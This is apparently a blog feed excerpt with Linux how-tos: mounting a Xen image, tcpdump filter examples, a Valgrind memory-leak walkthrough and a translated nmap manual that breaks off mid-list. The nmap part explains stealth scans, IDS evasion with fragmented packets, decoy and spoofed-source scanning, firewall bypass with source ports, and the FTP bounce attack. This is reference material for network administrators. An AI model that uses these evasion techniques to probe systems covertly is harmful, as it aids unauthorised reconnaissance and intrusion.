      <content type="html"><![CDATA[<p>1. First you need to find out the partitions and the startsector of partitions:</p><p>de&gt;[root@xen rruban]# file rheltest.img<br>rheltest.img: x86 boot sector, GRand Unified Bootloader (0.94);<br>partition 1: ID=0x83, active, starthead 1, startsector 63, 208782 sectors;<br>partition 2: ID=0x8e, starthead 0, startsector 208845, 3871665 sectors, code offset 0x48de&gt;</p><p>There are 3 partitions inside the image file. The startsector of each partition is also listed. Boot partition will have start sector 63.</p><p>2. Now you need to get the sector size:</p><p>de&gt;[root@xen]fdisk -lu rheltest.imgde&gt;</p><p>de&gt;<br>Disk rheltest.img: 0 MB, 0 bytes 255 heads, 63 sectors/track, 0 cylinders, total 0 sectors<br>Units = sectors of 1 <em> 512 = 512 bytes<br>Device Boot             Start         End      Blocks   Id  System<br>rheltest.img1   </em>          63      208844      104391   83  Linux<br>rheltest.img2          208845     4080509     1935832+  8e  Linux LVM<br>de&gt;</p><p>The above shows the sector byte size is 512 byte.</p><p>3. To calculating the offset: offset = start_sector x sector_byte_size.</p><p>The startsector is 63 for the first partition, therefore the first partition offset is: 63x512=32256</p><p>4. Finally, to mount the xen image, use:</p><p>de&gt;mount -o loop,offset=32256  test.img /foldernamede&gt;</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mplayer禁止弹出错误</title>
      <link href="/2009/12/22/mplayer-prohibits-pop-up-errors/"/>
      <url>/2009/12/22/mplayer-prohibits-pop-up-errors/</url>
      <content type="html"><![CDATA[<p>用mplayer播放视频时，放了全部的解码后，发现放rm文件时还缺少一个，到windows下去复制过来，drvc.dll,基本上就所有的都可以播 放了，但有些可以播放，但会出现 错误，所有就加上参数-really-quiet,就可以忽略了，可以编辑菜单，修改启动的参数就可以gmplayer -really-quiet %F</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>超级详细Tcpdump 的用法</title>
      <link href="/2009/12/22/super-detailed-tcpdump-usage/"/>
      <url>/2009/12/22/super-detailed-tcpdump-usage/</url>
      <content type="html"><![CDATA[<p>超级详细Tcpdump 的用法</p><p>第 一种是关于类型的关键字，主要包括host，net，port， 例如 host 210.27.48.2，指明 210.27.48.2是一台主机，net 202.0.0.0 指明 202.0.0.0是一个网络地址，port 23 指明端口号是23.如果没有指定类型，缺省的类型是host.</p><p>　　第二种是确定传输方向的关键字，主要包括src ， dst ，dst or src， dst and src ，这些关键字指明了传输的方向。举例说明，src 210.27.48.2 ，指明ip包中源地址是210.27.48.2 ， dst net 202.0.0.0 指明目的网络地址是202.0.0.0 .如果没有指明方向关键字，则缺省是src or dst关键字。</p><p>　　第三种是协议的关键字，主要包括 fddi，ip，arp，rarp，tcp，udp等类型。Fddi指明是在FDDI（分布式光纤数据接口网 络）上的特定 的网络协议，实际上它是”ether”的别名，fddi和ether具有类似的源地址和目的地址，所以可以将fddi协议包当作ether的包进行处理和 分析。其他的几个关键字就是指明了监听的包的协议内容。如果没有指定任何协议，则tcpdump将会监听所有协议的信息包。</p><p>　　除了这三 种类型的关键字之外，其他重要的关键字如下：gateway， broadcast，less，greater，还有三种逻辑运算，取非运算是 ‘not ‘ ‘！ ‘， 与运算是’and’，’&amp;&amp;’；或运算 是’or’ ，’││’；这些关键字可以组合起来构成强大的组合条件来满足人们的需要，下面举几个例子来说明。</p><p>　　普通情况下，直接启动tcpdump将监视第一个网络界面上所有流过的数据包。</p><p>　　# tcpdump</p><p>　　tcpdump： listening on fxp0</p><p>　　11：58：47.873028 202.102.245.40.netbios-ns &gt; 202.102.245.127.netbios-ns： udp 50</p><p>　　11：58：47.974331 0：10：7b：8：3a：56 &gt; 1：80：c2：0：0：0 802.1d ui/C len=43</p><p>　　0000 0000 0080 0000 1007 cf08 0900 0000</p><p>　　0e80 0000 902b 4695 0980 8701 0014 0002</p><p>　　000f 0000 902b 4695 0008 00</p><p>　　11：58：48.373134 0：0：e8：5b：6d：85 &gt; Broadcast sap e0 ui/C len=97</p><p>　　ffff 0060 0004 ffff ffff ffff ffff ffff</p><p>　　0452 ffff ffff 0000 e85b 6d85 4008 0002</p><p>　　0640 4d41 5354 4552 5f57 4542 0000 0000</p><p>　　0000 00</p><p>　　使用-i参数指定tcpdump监听的网络界面，这在计算机具有多个网络界面时非常有用，</p><p>　　使用-c参数指定要监听的数据包数量，</p><p>　　使用-w参数指定将监听到的数据包写入文件中保存</p><p>　　A想要截获所有210.27.48.1 的主机收到的和发出的所有的数据包：</p><p>　　#tcpdump host 210.27.48.1</p><p>　　B想要截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信，使用命令：（在命令行中适用　括号时，一定要</p><p>　　#tcpdump host 210.27.48.1 and （210.27.48.2 or 210.27.48.3 ）</p><p>　　C如果想要获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包，使用命令：</p><p>　　#tcpdump ip host 210.27.48.1 and ！ 210.27.48.2</p><p>　　D如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令：</p><p>　　#tcpdump tcp port 23 host 210.27.48.1</p><p>　　E 对本机的udp 123 端口进行监视 123 为ntp的服务端口</p><p>　　# tcpdump udp port 123</p><p>　　F 系统将只对名为hostname的主机的通信数据包进行监视。主机名可以是本地主机，也可以是网络上的任何一台计算机。下面的命令可以读取主机hostname发送的所有数据：</p><p>　　#tcpdump -i eth0 src host hostname</p><p>　　G 下面的命令可以监视所有送到主机hostname的数据包：</p><p>　　#tcpdump -i eth0 dst host hostname</p><p>　　H  我们还可以监视通过指定网关的数据包：</p><p>　　#tcpdump -i eth0 gateway Gatewayname</p><p>　　I 如果你还想监视编址到指定端口的TCP或UDP数据包，那么执行以下命令：</p><p>　　#tcpdump -i eth0 host hostname and port 80</p><p>　　J 如果想要获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包</p><p>　　，使用命令：</p><p>　　#tcpdump ip host 210.27.48.1 and ！ 210.27.48.2</p><p>　　K 想要截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信，使用命令</p><p>　　：（在命令行中适用　括号时，一定要</p><p>　　#tcpdump host 210.27.48.1 and （210.27.48.2 or 210.27.48.3 ）</p><p>　　L 如果想要获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包，使用命令：</p><p>　　#tcpdump ip host 210.27.48.1 and ！ 210.27.48.2</p><p>　　M 如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令：</p><p>　　#tcpdump tcp port 23 host 210.27.48.1</p><p>　　第三种是协议的关键字，主要包括fddi，ip ，arp，rarp，tcp，udp等类型</p><p>　　除了这三种类型的关键字之外，其他重要的关键字如下：gateway， broadcast，less，</p><p>　　greater，还有三种逻辑运算，取非运算是 ‘not ‘ ‘！ ‘， 与运算是’and’，’&amp;&amp;’；或运算 是’o</p><p>　　r’ ，’||’；</p><p>　　第二种是确定传输方向的关键字，主要包括src ， dst ，dst or src， dst and src ，</p><p>　　如果我们只需要列出送到80端口的数据包，用dst port；如果我们只希望看到返回80端口的数据包，用src port.</p><p>　　#tcpdump –i eth0 host hostname and dst port 80  目的端口是80</p><p>　　或者</p><p>　　#tcpdump –i eth0 host hostname and src port 80  源端口是80  一般是提供http的服务的主机</p><p>　　如果条件很多的话  要在条件之前加and 或 or 或 not</p><p>　　#tcpdump -i eth0 host ！ 211.161.223.70 and ！ 211.161.223.71 and dst port 80</p><p>　　如果在ethernet 使用混杂模式 系统的日志将会记录</p><p>　　May  7 20：03：46 localhost kernel： eth0： Promiscuous mode enabled.</p><p>　　May  7 20：03：46 localhost kernel： device eth0 entered promiscuous mode</p><p>　　May  7 20：03：57 localhost kernel： device eth0 left promiscuous mode</p><p>　 　tcpdump对截获的数据并没有进行彻底解码，数据包内的大部分内容是使用十六进制的形式直接打印输出的。显然这不利于分析网络故障，通常的 解决办法是先使用带-w参数的tcpdump 截获数据并保存到文件中，然后再使用其他程序进行解码分析。当然也应该定义过滤规则，以避免捕获的数据包填满整个硬盘。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux 内存调试工具- Valgrind 使用初探</title>
      <link href="/2009/12/22/linux-memory-debugging-tool-valgrind-uses-preliminary-exploration/"/>
      <url>/2009/12/22/linux-memory-debugging-tool-valgrind-uses-preliminary-exploration/</url>
      <content type="html"><![CDATA[<p>Valgrind 是在linux系统下开发应用程序时用于调试内存问题的工具。它尤其擅长发现内存管理的问题，它可以检查程序运行时的内存泄漏问题。</p><p>   它的官方网址是 <a href="http://www.valgrind.org/" target="_blank" rel="noopener">http://www.valgrind.org/</a></p><p>   下载最新版本的Valgrind，目前是3.2.0。 wget <a href="http://www.valgrind.org/downloads/valkyrie-1.2.0.tar.bz2" target="_blank" rel="noopener">http://www.valgrind.org/downloads/valkyrie-1.2.0.tar.bz2</a></p><p>   执行常规的安装步骤：./confgure &amp;&amp; make &amp;&amp; make install。注意： 系统必须安装QT的开发包。即便这样在make 时还是出现qplatformdefs.h这个文件找不到的情况，导致make失败。查找系统中的qplatformdefs.h 之后，发现没有存在于qt的标准头文件目录/usr/lib/qt-3.3/include。如是将/usr/lib/qt-3.3/mkspecs /linux-g++/ 目录下该头文件复制标准头文件目录，重新make ，后面一切OK。</p><p>初次使用</p><pre><code>编译如下代码:  gcc -Wall example.c -g -o example </code></pre><p>#include &lt;stdlib.h&gt;  </p><p>void f(void)<br>{<br>   int<em> x = malloc(10 </em> sizeof(int));<br>   x[10] = 0;        // problem 1: heap block overrun<br>}                    // problem 2: memory leak – x not freed  </p><p>int main(void)<br>{<br>     f();<br>     return 0;<br>}</p><pre><code>注意：gcc 的-g 选项让Valgrind调试输出时指出相应信息的代码所在的行号。</code></pre><p>valgrind –tool=memcheck –leak-check=yes ./example</p><p>==6742== Memcheck, a memory error detector for x86-linux.<br>==6742== Copyright (C) 2002-2004, and GNU GPL’d, by Julian Seward et al.<br>==6742== Using valgrind-2.2.0, a program supervision framework for x86-linux.<br>==6742== Copyright (C) 2000-2004, and GNU GPL’d, by Julian Seward et al.<br>==6742== For more details, rerun with: -v<br>==6742==<br>==6742== Invalid write of size 4<br>==6742==    at 0x8048384: f (example.c:6)<br>==6742==    by 0x80483AC: main (example.c:12)<br>==6742==  Address 0x1B908050 is 0 bytes after a block of size 40 alloc’d<br>==6742==    at 0x1B904984: malloc (vg_replace_malloc.c:131)<br>==6742==    by 0x8048377: f (example.c:5)<br>==6742==    by 0x80483AC: main (example.c:12)<br>==6742==<br>==6742== ERROR SUMMARY: 1 errors from 1 contexts (suppressed: 12 from 1)<br>==6742== malloc/free: in use at exit: 40 bytes in 1 blocks.<br>==6742== malloc/free: 1 allocs, 0 frees, 40 bytes allocated.<br>==6742== For counts of detected errors, rerun with: -v<br>==6742== searching for pointers to 1 not-freed blocks.<br>==6742== checked 1360800 bytes.<br>==6742==<br>==6742==<br>==6742== 40 bytes in 1 blocks are definitely lost in loss record 1 of 1<br>==6742==    at 0x1B904984: malloc (vg_replace_malloc.c:131)<br>==6742==    by 0x8048377: f (example.c:5)<br>==6742==    by 0x80483AC: main (example.c:12)<br>==6742==<br>==6742== LEAK SUMMARY:<br>==6742==    definitely lost: 40 bytes in 1 blocks.<br>==6742==    possibly lost:   0 bytes in 0 blocks.<br>==6742==    still reachable: 0 bytes in 0 blocks.<br>==6742==         suppressed: 0 bytes in 0 blocks.<br>==6742== Reachable blocks (those to which a pointer was found) are not shown.<br>==6742== To see them, rerun with: –show-reachable=yes</p><p>   上面的C程序存在两个错误：1. 数组下标越界；2. 分配的内存没有释放，存在内存泄露的问题。对于错误1，看Valgrind的调试信息片断</p><p>==6742== Invalid write of size 4<br>==6742==    at 0x8048384: f (example.c:6)<br>==6742==    by 0x80483AC: main (example.c:12)<br>==6742==  Address 0x1B908050 is 0 bytes after a block of size 40 alloc’d<br>==6742==    at 0x1B904984: malloc (vg_replace_malloc.c:131)<br>==6742==    by 0x8048377: f (example.c:5)</p><p>对于错误2，看这个</p><p>==6742== malloc/free: 1 allocs, 0 frees, 40 bytes allocated.</p><p>……</p><p>==6742== 40 bytes in 1 blocks are definitely lost in loss record 1 of 1<br>==6742==    at 0x1B904984: malloc (vg_replace_malloc.c:131)<br>==6742==    by 0x8048377: f (example.c:5)<br>==6742==    by 0x80483AC: main (example.c:12)</p><p>相关链接：</p><p>   <a href="http://www.valgrind.org/docs/manual/quick-start.html" target="_blank" rel="noopener">http://www.valgrind.org/docs/manual/quick-start.html</a></p><p>   <a href="http://www-128.ibm.com/developerworks/cn/linux/l-pow-debug/" target="_blank" rel="noopener">http://www-128.ibm.com/developerworks/cn/linux/l-pow-debug/</a></p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>nmap使用详解</title>
      <link href="/2009/12/22/nmap-uses-a-detailed-solution/"/>
      <url>/2009/12/22/nmap-uses-a-detailed-solution/</url>
      <content type="html"><![CDATA[<p>nmap是一个网络探测和安全扫描程序， 系统管理者和个人可以使用这个软件扫描大型的网络，获取那台主机正在运行以及提供什么服务等信息。nmap支持很多扫描技术，例如：UDP、TCP connect()、TCP SYN(半开扫描)、ftp代理(bounce攻击)、反向标志、ICMP、FIN、ACK扫描、圣诞树(Xmas Tree)、SYN扫描和null扫描。从扫描类型一节可以得到细节。nmap还提供了一些高级的特征，例如：通过TCP/IP协议栈特征探测操作系统类 型，秘密扫描，动态延时和重传计算，并行扫描，通过并行ping扫描探测关闭的主机，诱饵扫描，避开端口过滤检测，直接RPC扫描(无须端口影射)，碎片 扫描，以及灵活的目标和端口设定.<br>--------------------------------------------------------------------------------<br>1.名称</p><p>nmap-网络探测和安全扫描工具</p><p>2.语法</p><p>nmap [Scan Type(s)] [Options]</p><p>3.描述</p><p>　 　nmap是一个网络探测和安全扫描程 序，系统管理者和个人可以使用这个软件扫描大型的网络，获取那台主机正在运行以及提供什么服务等信息。nmap支持很多扫描技术，例如：UDP、TCP connect()、TCP SYN(半开扫描)、ftp代理(bounce攻击)、反向标志、ICMP、FIN、ACK扫描、圣诞树(Xmas Tree)、SYN扫描和null扫描。从扫描类型一节可以得到细节。nmap还提供了一些高级的特征，例如：通过TCP/IP协议栈特征探测操作系统类 型，秘密扫描，动态延时和重传计算，并行扫描，通过并行ping扫描探测关闭的主机，诱饵扫描，避开端口过滤检测，直接RPC扫描(无须端口影射)，碎片 扫描，以及灵活的目标和端口设定。</p><p>　　为了提高nmap在non-root状态下的性能，软件的设计者付出了很大的努力。很不幸，一些内核界面(例如raw socket)需要在root状态下使用。所以应该尽可能在root使用nmap。</p><p>　 　nmap运行通常会得到被扫描主机端 口的列表。nmap总会给出well known端口的服务名(如果可能)、端口号、状态和协议等信息。每个端口的状态有：open、filtered、unfiltered。open状态意 味着目标主机能够在这个端口使用accept()系统调用接受连接。filtered状态表示：防火墙、包过滤和其它的网络安全软件掩盖了这个端口，禁止 nmap探测其是否打开。unfiltered表示：这个端口关闭，并且没有防火墙/包过滤软件来隔离nmap的探测企图。通常情况下，端口的状态基本都 是unfiltered状态，只有在大多数被扫描的端口处于filtered状态下，才会显示处于unfiltered状态的端口。</p><p>　　根据使用的功能选项，nmap也可以报告远程主机的下列特征：使用的操作系统、TCP序列、运行绑定到每个端口上的应用程序的用户名、DNS名、主机地址是否是欺骗地址、以及其它一些东西。</p><p>4.功能选项</p><p>　　功能选项可以组合使用。一些功能选项只能够在某种扫描模式下使用。nmap会自动识别无效或者不支持的功能选项组合，并向用户发出警告信息。</p><p>　　如果你是有经验的用户，可以略过结尾的示例一节。可以使用nmap -h快速列出功能选项的列表。</p><p>4.1 扫描类型</p><p>　　-sT<br>　 　TCP connect()扫描：这是最基本的TCP扫描方式。connect()是一种系统调用，由操作系统提供，用来打开一个连接。如果目标端口有程序监听， connect()就会成功返回，否则这个端口是不可达的。这项技术最大的优点是，你勿需root权限。任何UNIX用户都可以自由使用这个系统调用。这 种扫描很容易被检测到，在目标主机的日志中会记录大批的连接请求以及错误信息。<br>　　-sS<br>　　TCP同步扫描(TCP SYN)：因为不必全部打开一个TCP连接，所以这项技术通常称为半开扫描(half-open)。你可以发出一个TCP同步包(SYN)，然后等待回 应。如果对方返回SYN|ACK(响应)包就表示目标端口正在监听；如果返回RST数据包，就表示目标端口没有监听程序；如果收到一个SYN|ACK包， 源主机就会马上发出一个RST(复位)数据包断开和目标主机的连接，这实际上有我们的操作系统内核自动完成的。这项技术最大的好处是，很少有系统能够把这 记入系统日志。不过，你需要root权限来定制SYN数据包。<br>　　-sF -sF -sN<br>　　秘密FIN数据包扫描、圣诞树 (Xmas Tree)、空(Null)扫描模式：即使SYN扫描都无法确定的情况下使用。一些防火墙和包过滤软件能够对发送到被限制端口的SYN数据包进行监视，而 且有些程序比如synlogger和courtney能够检测那些扫描。这些高级的扫描方式可以逃过这些干扰。这些扫描方式的理论依据是：关闭的端口需要 对你的探测包回应RST包，而打开的端口必需忽略有问题的包(参考RFC 793第64页)。FIN扫描使用暴露的FIN数据包来探测，而圣诞树扫描打开数据包的FIN、URG和PUSH标志。不幸的是，微软决定完全忽略这个标 准，另起炉灶。所以这种扫描方式对Windows95/NT无效。不过，从另外的角度讲，可以使用这种方式来分别两种不同的平台。如果使用这种扫描方式可 以发现打开的端口，你就可以确定目标注意运行的不是Windows系统。如果使用-sF、-sX或者-sN扫描显示所有的端口都是关闭的，而使用SYN扫 描显示有打开的端口，你可以确定目标主机可能运行的是Windwos系统。现在这种方式没有什么太大的用处，因为nmap有内嵌的操作系统检测功能。还有 其它几个系统使用和windows同样的处理方式，包括Cisco、BSDI、HP/UX、MYS、IRIX。在应该抛弃数据包时，以上这些系统都会从打 开的端口发出复位数据包。<br>　　-sP<br>　　ping扫描：有时你只是想知道此时网络上哪些主机正在运行。通过向你指定的网络内的每个 IP地址发送ICMP echo请求数据包，nmap就可以完成这项任务。如果主机正在运行就会作出响应。不幸的是，一些站点例如：microsoft.com阻塞ICMP echo请求数据包。然而，在默认的情况下nmap也能够向80端口发送TCP ack包，如果你收到一个RST包，就表示主机正在运行。nmap使用的第三种技术是：发送一个SYN包，然后等待一个RST或者SYN/ACK包。对于 非root用户，nmap使用connect()方法。<br>　　在默认的情况下(root用户)，nmap并行使用ICMP和ACK技术。<br>　　注意，nmap在任何情况下都会进行ping扫描，只有目标主机处于运行状态，才会进行后续的扫描。如果你只是想知道目标主机是否运行，而不想进行其它扫描，才会用到这个选项。<br>　　-sU<br>　　UDP扫描：如果你想知道在某台主机上提供哪些UDP(用户数据报协议,RFC768)服务，可以使用这种扫描方法。nmap首先向目标主机的每个端口发出一个0字节的UDP包，如果我们收到端口不可达的ICMP消息，端口就是关闭的，否则我们就假设它是打开的。<br>　 　有些人可能会想UDP扫描是没有什么意思的。但是，我经常会想到最近出现的solaris rpcbind缺陷。rpcbind隐藏在一个未公开的UDP端口上，这个端口号大于32770。所以即使端口111(portmap的众所周知端口号) 被防火墙阻塞有关系。但是你能发现大于30000的哪个端口上有程序正在监听吗?使用UDP扫描就能！cDc Back Orifice的后门程序就隐藏在Windows主机的一个可配置的UDP端口中。不考虑一些通常的安全缺陷，一些服务例如:snmp、tftp、NFS 使用UDP协议。不幸的是，UDP扫描有时非常缓慢，因为大多数主机限制ICMP错误信息的比例(在RFC1812中的建议)。例如，在Linux内核中 (在net/ipv4/icmp.h文件中)限制每4秒钟只能出现80条目标不可达的ICMP消息，如果超过这个比例，就会给1/4秒钟的处罚。 solaris的限制更加严格，每秒钟只允许出现大约2条ICMP不可达消息，这样，使扫描更加缓慢。nmap会检测这个限制的比例，减缓发送速度，而不 是发送大量的将被目标主机丢弃的无用数据包。<br>　　不过Micro$oft忽略了RFC1812的这个建议，不对这个比例做任何的限制。所以我们可以能够快速扫描运行Win95/NT的主机上的所有65K个端口。<br>　　-sA<br>　　ACK扫描：这项高级的扫描方法通常用来穿过防火墙的规则集。通常情况下，这有助于确定一个防火墙是功能比较完善的或者是一个简单的包过滤程序，只是阻塞进入的SYN包。<br>　 　这种扫描是向特定的端口发送ACK包(使用随机的应答/序列号)。如果返回一个RST包，这个端口就标记为unfiltered状态。如果什么都没有返 回，或者返回一个不可达ICMP消息，这个端口就归入filtered类。注意，nmap通常不输出unfiltered的端口，所以在输出中通常不显示 所有被探测的端口。显然，这种扫描方式不能找出处于打开状态的端口。<br>　　-sW<br>　　对滑动窗口的扫描：这项高级扫描技术非常类似于 ACK扫描，除了它有时可以检测到处于打开状态的端口，因为滑动窗口的大小是不规则的，有些操作系统可以报告其大小。这些系统至少包括：某些版本的 AIX、Amiga、BeOS、BSDI、Cray、Tru64 UNIX、DG/UX、OpenVMS、Digital UNIX、OpenBSD、OpenStep、QNX、Rhapsody、SunOS 4.x、Ultrix、VAX、VXWORKS。从nmap-hackers邮件3列表的文档中可以得到完整的列表。<br>　　-sR<br>　 　RPC扫描。这种方法和nmap的其它不同的端口扫描方法结合使用。选择所有处于打开状态的端口向它们发出SunRPC程序的NULL命令，以确定它们 是否是RPC端口，如果是，就确定是哪种软件及其版本号。因此你能够获得防火墙的一些信息。诱饵扫描现在还不能和RPC扫描结合使用。<br>　　-b<br>　 　FTP反弹攻击(bounce attack):FTP协议(RFC 959)有一个很有意思的特征，它支持代理FTP连接。也就是说，我能够从evil.com连接到FTP服务器target.com，并且可以要求这台 FTP服务器为自己发送Internet上任何地方的文件！1985年，RFC959完成时，这个特征就能很好地工作了。然而，在今天的Internet 中，我们不能让人们劫持FTP服务器，让它向Internet上的任意节点发送数据。如同Hobbit在1995年写的文章中所说的，这个协议”能够用来 做投递虚拟的不可达邮件和新闻，进入各种站点的服务器,填满硬盘，跳过防火墙，以及其它的骚扰活动，而且很难进行追踪”。我们可以使用这个特征，在一台代 理FTP服务器扫描TCP端口。因此，你需要连接到防火墙后面的一台FTP服务器，接着进行端口扫描。如果在这台FTP服务器中有可读写的目录，你还可以 向目标端口任意发送数据(不过nmap不能为你做这些)。<br>　　传递给-b功能选项的参数是你要作为代理的FTP服务器。语法格式为：<br>　　-b username:password@server:port。<br>　　除了server以外，其余都是可选的。如果你想知道什么服务器有这种缺陷，可以参考我在Phrack 51发表的文章。还可以在nmap的站点得到这篇文章的最新版本。  </p><p>4.2 通用选项</p><p>　　这些内容不是必需的，但是很有用。</p><p>　　-P0<br>　　在扫描之前，不必ping主机。有些网络的防火墙不允许ICMP echo请求穿过，使用这个选项可以对这些网络进行扫描。microsoft.com就是一个例子，因此在扫描这个站点时，你应该一直使用-P0或者-PT 80选项。<br>　　-PT<br>　 　扫描之前，使用TCP ping确定哪些主机正在运行。nmap不是通过发送ICMP echo请求包然后等待响应来实现这种功能，而是向目标网络(或者单一主机)发出TCP ACK包然后等待回应。如果主机正在运行就会返回RST包。只有在目标网络/主机阻塞了ping包，而仍旧允许你对其进行扫描时，这个选项才有效。对于非 root用户，我们使用connect()系统调用来实现这项功能。使用-PT &lt;端口号&gt;来设定目标端口。默认的端口号是80，因为这个端口通常不会被过滤。<br>　　-PS<br>　　对于root用户，这个选项让nmap使用SYN包而不是ACK包来对目标主机进行扫描。如果主机正在运行就返回一个RST包(或者一个SYN/ACK包)。<br>　　-PI<br>　 　设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。使用这个选项让nmap发现正在运行的主机的同时，nmap也会对你的直接子网广播地址进行观察。直接子网广 播地址一些外部可达的IP地址，把外部的包转换为一个内向的IP广播包，向一个计算机子网发送。这些IP广播包应该删除，因为会造成拒绝服务攻击(例如 smurf)。<br>　　-PB<br>　　这是默认的ping扫描选项。它使用ACK(-PT)和ICMP(-PI)两种扫描类型并行扫描。如果防火墙能够过滤其中一种包，使用这种方法，你就能够穿过防火墙。<br>　　-O<br>　 　这个选项激活对TCP/IP指纹特征(fingerprinting)的扫描，获得远程主机的标志。换句话说，nmap使用一些技术检测目标主机操作系 统网络协议栈的特征。nmap使用这些信息建立远程主机的指纹特征，把它和已知的操作系统指纹特征数据库做比较，就可以知道目标主机操作系统的类型。<br>　　-I<br>　 　这个选项打开nmap的反向标志扫描功能。Dave Goldsmith 1996年向bugtap发出的邮件注意到这个协议，ident协议(rfc 1413)允许使用TCP连接给出任何进程拥有者的用户名，即使这个进程并没有初始化连接。例如，你可以连接到HTTP端口，接着使用identd确定这 个服务器是否由root用户运行。这种扫描只能在同目标端口建立完全的TCP连接时(例如：-sT扫描选项)才能成功。使用-I选项是，远程主机的 identd精灵进程就会查询在每个打开的端口上监听的进程的拥有者。显然，如果远程主机没有运行identd程序，这种扫描方法无效。<br>　　-f<br>　 　这个选项使nmap使用碎片IP数据包发送SYN、FIN、XMAS、NULL。使用碎片数据包增加包过滤、入侵检测系统的难度，使其无法知道你的企 图。不过，要慎重使用这个选项！有些程序在处理这些碎片包时会有麻烦，我最喜欢的嗅探器在接受到碎片包的头36个字节时，就会发生 segmentation faulted。因此，在nmap中使用了24个字节的碎片数据包。虽然包过滤器和防火墙不能防这种方法，但是有很多网络出于性能上的考虑，禁止数据包的 分片。<br>　　注意这个选项不能在所有的平台上使用。它在Linux、FreeBSD、OpenBSD以及其它一些UNIX系统能够很好工作。<br>　　-v<br>　　冗余模式。强烈推荐使用这个选项，它会给出扫描过程中的详细信息。使用这个选项，你可以得到事半功倍的效果。使用-d选项可以得到更加详细的信息。<br>　　-h<br>　　快速参考选项。<br>　　-oN<br>　　把扫描结果重定向到一个可读的文件logfilename中。<br>　　-oM<br>　 　把扫描结果重定向到logfilename文件中，这个文件使用主机可以解析的语法。你可以使用-oM -来代替logfilename，这样输出就被重定向到标准输出stdout。在这种情况下，正常的输出将被覆盖，错误信息荏苒可以输出到标准错误 stderr。要注意，如果同时使用了-v选项，在屏幕上会打印出其它的信息。<br>　　-oS 　　 thIs l0gz th3 r3suLtS of YouR ScanZ iN a s| 　　THe fiL3 U sPecfy 4s an arGuMEnT! U kAn gIv3 the 4rgument -<br>　　(wItHOUt qUOteZ) to sh00t output iNT0 stDouT!@!! 莫名其妙，下面是我猜着翻译的，相形字？<br>　　把扫描结果重定向到一个文件logfilename中，这个文件使用一种”黑客方言”的语法形式(作者开的玩笑?)。同样，使用-oS -就会把结果重定向到标准输出上。<br>　　-resume<br>　 　某个网络扫描可能由于control-C或者网络损失等原因被中断，使用这个选项可以使扫描接着以前的扫描进行。logfilename是被取消扫描的 日志文件，它必须是可读形式或者机器可以解析的形式。而且接着进行的扫描不能增加新的选项，只能使用与被中断的扫描相同的选项。nmap会接着日志文件中 的最后一次成功扫描进行新的扫描。<br>　　-iL<br>　　从inputfilename文件中读取扫描的目标。在这个文件中要有一个主机或者网络的列表，由空格键、制表键或者回车键作为分割符。如果使用-iL -，nmap就会从标准输入stdin读取主机名字。你可以从指定目标一节得到更加详细的信息。<br>　　-iR<br>　　让nmap自己随机挑选主机进行扫描。<br>　　-p &lt;端口范围&gt;<br>　 　这个选项让你选择要进行扫描的端口号的范围。例如，-p 23表示：只扫描目标主机的23号端口。-p 20-30,139,60000-表示：扫描20到30号端口，139号端口以及所有大于60000的端口。在默认情况下，nmap扫描从1到1024号 以及nmap-services文件(如果使用RPM软件包，一般在/usr/share/nmap/目录中)中定义的端口列表。<br>　　-F<br>　　快速扫描模式，只扫描在nmap-services文件中列出的端口。显然比扫描所有65535个端口要快。<br>　　-D<br>　 　使用诱饵扫描方法对目标网络/主机进行扫描。如果nmap使用这种方法对目标网络进行扫描，那么从目标主机/网络的角度来看，扫描就象从其它主机 (decoy1,等)发出的。从而，即使目标主机的IDS(入侵检测系统)对端口扫描发出报警，它们也不可能知道哪个是真正发起扫描的地址，哪个是无辜 的。这种扫描方法可以有效地对付例如路由跟踪、response-dropping等积极的防御机制，能够很好地隐藏你的IP地址。<br>　　每个 诱饵主机名使用逗号分割开，你也可以使用ME选项，它代表你自己的主机，和诱饵主机名混杂在一起。如果你把ME放在第六或者更靠后的位置，一些端口扫描检 测软件几乎根本不会显示你的IP地址。如果你不使用ME选项，nmap会把你的IP地址随机夹杂在诱饵主机之中。<br>　　注意:你用来作为诱饵的 主机应该正在运行或者你只是偶尔向目标发送SYN数据包。很显然，如果在网络上只有一台主机运行，目标将很轻松就会确定是哪台主机进行的扫描。或许，你还 要直接使用诱饵的IP地址而不是其域名，这样诱饵网络的域名服务器的日志上就不会留下关于你的记录。<br>　　还要注意：一些愚蠢的端口扫描检测软件会拒绝路由试图进行端口扫描的主机。因而，你需要让目标主机和一些诱饵断开连接。如果诱饵是目标主机的网关或者就是其自己时，会给目标主机造成很大问题。所以你需要慎重使用这个选项。<br>　　诱饵扫描既可以在起始的ping扫描也可以在真正的扫描状态下使用。它也可以和-O选项组合使用。<br>　　使用太多的诱饵扫描能够减缓你的扫描速度甚至可能造成扫描结果不正确。同时，有些ISP会把你的欺骗包过滤掉。虽然现在大多数的ISP不会对此进行限制。<br>　　-S &lt;IP_Address&gt;<br>　　在一些情况下，nmap可能无法确定你的源地址(nmap会告诉你)。在这种情况使用这个选项给出你的IP地址。<br>　　在欺骗扫描时，也使用这个选项。使用这个选项可以让目标认为是其它的主机对自己进行扫描。<br>　　-e<br>　　告诉nmap使用哪个接口发送和接受数据包。nmap能够自动对此接口进行检测，如果无效就会告诉你。<br>　　-g<br>　 　设置扫描的源端口。一些天真的防火墙和包过滤器的规则集允许源端口为DNS(53)或者FTP-DATA(20)的包通过和实现连接。显然，如果攻击者 把源端口修改为20或者53，就可以摧毁防火墙的防护。在使用UDP扫描时，先使用53号端口；使用TCP扫描时，先使用20号端口。注意只有在能够使用 这个端口进行扫描时，nmap才会使用这个端口。例如，如果你无法进行TCP扫描，nmap会自动改变源端口，即使你使用了-g选项。<br>　　